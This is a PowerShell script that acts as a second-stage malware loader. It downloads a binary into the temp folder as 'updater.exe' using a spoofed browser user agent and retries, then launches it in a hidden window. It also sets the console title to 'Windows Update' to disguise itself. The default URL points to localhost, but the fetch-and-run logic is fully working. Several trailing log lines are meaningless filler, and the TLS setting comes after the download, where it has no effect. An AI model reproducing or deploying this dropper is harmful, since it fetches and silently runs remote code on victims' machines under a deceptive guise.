
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://localhost:8080/stage2.bin',
    [string]$Stage2Path = "$env:TEMP\updater.exe",
    [string]$LogPath = "$env:TEMP\report.txt",
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$RequestTimeout = 100,
    [int]$MaxAttempts = 2,
    [int]$BackoffSeconds = 2
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$RetryCount = 2,
        [int]$RetryDelay = 2,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

Write-StageLog -Message "Starting stage 2 download"
$ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TransferUrl
$ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $Stage2Path -RetryCount $MaxAttempts -RetryDelay $BackoffSeconds -UserAgent $BrowserAgent
if ($ResultObject) {
    Write-StageLog -Message "Stage 2 downloaded"
    Start-Process -FilePath $Stage2Path -WindowStyle Hidden -ErrorAction SilentlyContinue
}
else {
    Write-Warning "Stage 2 transfer did not complete"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TransferUrl
    Destination = $Stage2Path
    RetryCount = $MaxAttempts
    TimeoutSec = $RequestTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Applying operation timeout"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Preparing working directory"
Write-Verbose "Inspecting process list"
Write-Verbose "Stage handoff finished"
Write-Verbose "Validating result"
Write-Verbose "Operation completed"
Write-Verbose "Starting workflow"
Write-Verbose "Checking local path"
Write-Output "stage 13 initialized"
$Host.UI.RawUI.WindowTitle = "Windows Update"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
